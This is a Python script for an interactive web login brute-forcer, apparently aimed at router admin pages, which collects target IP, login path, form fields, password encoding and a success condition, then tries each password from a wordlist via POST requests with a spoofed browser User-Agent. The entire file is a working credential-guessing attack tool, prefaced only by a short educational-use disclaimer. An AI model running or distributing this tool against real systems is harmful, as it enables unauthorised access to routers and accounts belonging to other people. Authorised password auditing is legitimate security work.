# #############################################################
# # Interactive Web Login Brute-Forcer                        #
# # Authored by: [Your Name Here]                             #
# # Version: 3.0 (Interactive)                                #
# #                                                           #
# # A user-friendly framework for auditing web login portals. #
# #############################################################
#
# DISCLAIMER: This tool is for educational and ethical purposes only.
# Do not use this on any system you do not own or have permission to test.
#

import requests
import sys
import os
import time
import base64

def display_banner():
    """Prints a cool banner for the tool."""
    os.system("cls" if os.name == "nt" else "clear")
    banner = """
    ==============================================================
    |                                                            |
    |        Interactive Web Login Brute-Forcer v3.0             |
    |               Authored by: [Your Name Here]                |
    |                                                            |
    ==============================================================
    """
    print(banner)

def get_user_config():
    """Interactively prompts the user to build the configuration."""
    config = {"payload": {}}
    print("\n--- Interactive Target Configuration ---\n")
    print("I will now ask for details about your target. Find this info using your")
    print("browser's F12 Developer Tools in the 'Network' tab after a login attempt.\n")

    try:
        # 1. Get Router IP
        print("1. Target IP Address")
        print("   (e.g., 192.168.0.1, 192.168.1.1)")
        config["router_ip"] = input("   > Enter IP: ").strip()

        # 2. Get Login URL Path
        print("\n2. Login URL Path")
        print("   (This is the end part of the 'Request URL', e.g., /LoginCheck, /goform/login)")
        config["login_url_path"] = input("   > Enter URL Path: ").strip()

        # 3. Get Payload
        print("\n3. Payload / Form Data")
        print("   (Enter all fields sent with the login. For the password field's value,")
        print("   type the special word '{password}' exactly as shown.)")
        while True:
            key = input("   > Enter Field Name (or press Enter to finish): ").strip()
            if not key:
                break
            value = input(f"   > Enter Value for '{key}': ").strip()
            config["payload"][key] = value
        
        if "{password}" not in "".join(config["payload"].values()):
             print("\n   [WARNING] You did not specify '{password}' in any payload value.")
             print("   The script will not know where to insert the passwords from your wordlist.")


        # 4. Get Encoding
        print("\n4. Password Encoding Method")
        print("   (How the password is sent. Check the 'Payload' tab. If it looks like")
        print("   random letters and numbers, it's likely base64.)")
        while True:
            encoding = input("   > Enter Encoding ('plain' or 'base64'): ").strip().lower()
            if encoding in ["plain", "base64"]:
                config["encoding"] = encoding
                break
            else:
                print("   [!] Invalid choice. Please enter 'plain' or 'base64'.")

        # 5. Get Success Condition
        print("\n5. Success Condition")
        print("   (How do we know a login was successful?)")
        print("   - 'redirect': The browser is sent to a new page (e.g., index.asp).")
        print("   - 'text_in_response': The server sends back a specific message (e.g., '{\"error\":0}').")
        while True:
            cond_type = input("   > Enter Condition Type ('redirect' or 'text_in_response'): ").strip().lower()
            if cond_type in ["redirect", "text_in_response"]:
                break
            else:
                print("   [!] Invalid choice. Please enter 'redirect' or 'text_in_response'.")
        
        print(f"\n   (For a '{cond_type}', what text should we look for?)")
        cond_value = input("   > Enter Success Value: ").strip()
        config["success_condition"] = {"type": cond_type, "value": cond_value}

        print("\n--- Configuration Complete! ---\n")
        return config

    except KeyboardInterrupt:
        print("\n\n[!] Configuration cancelled by user. Exiting.")
        return None


def encode_password(password, method):
    """Encodes the password based on the configured method."""
    if method == "base64":
        return base64.b64encode(password.encode('utf-8')).decode('utf-8')
    elif method == "plain":
        return password
    else:
        raise ValueError(f"Unsupported encoding method: {method}")

def main():
    """Main function to run the brute-force attack."""
    display_banner()
    
    config = get_user_config()
    if not config:
        return

    # --- Setup from config ---
    login_post_url = f"http://{config['router_ip']}{config['login_url_path']}"
    login_page_url = f"http://{config['router_ip']}/login.asp" # Assumed for Referer

    wordlist_path = input("📂 Enter the path to your password wordlist file: ").strip()

    if not os.path.isfile(wordlist_path):
        print("\n❌ Error: Wordlist file not found at that path!")
        return

    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"\n❌ Error reading wordlist file: {e}")
        return

    if not passwords:
        print("\n❌ Error: The wordlist file is empty or could not be read.")
        return

    total_passwords = len(passwords)
    print(f"\n[*] Target IP: {config['router_ip']}")
    print(f"[*] Login Endpoint: {login_post_url}")
    print(f"[*] Wordlist loaded: {total_passwords} passwords to try.")
    print("--------------------------------------------------")
    
    found = False
    for i, password in enumerate(passwords, start=1):
        session = requests.Session()
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Referer': login_page_url
            }

            encoded_pwd = encode_password(password, config["encoding"])
            
            # Dynamically build the payload
            current_payload = {}
            for key, value in config["payload"].items():
                current_payload[key] = value.replace("{password}", encoded_pwd)

            progress_text = f"[*] Trying password {i}/{total_passwords}: {password.ljust(20)}"
            sys.stdout.write('\r' + progress_text)
            sys.stdout.flush()
            
            response = session.post(login_post_url, headers=headers, data=current_payload, timeout=5, allow_redirects=False)

            # --- DYNAMIC SUCCESS CHECK ---
            success = False
            cond_type = config["success_condition"]["type"]
            cond_value = config["success_condition"]["value"]

            if cond_type == "redirect":
                location_header = response.headers.get("Location", "")
                if response.status_code == 302 and cond_value in location_header:
                    success = True
            elif cond_type == "text_in_response":
                if cond_value in response.text:
                    success = True
            
            if success:
                print("\n\n" + "="*50)
                print(f"[+] SUCCESS! Password Found: {password}")
                print("="*50)
                found = True
                break

        except requests.exceptions.RequestException as e:
            print(f"\n\n❌ CRITICAL Network Error: Could not connect to {config['router_ip']}.")
            print(f"   Please check your connection. Aborting. Error: {e}")
            return
        
        time.sleep(0.2) 

    if not found:
        print("\n\n[-] Attack finished. Password not found in the provided wordlist.")


if __name__ == "__main__":
    main()
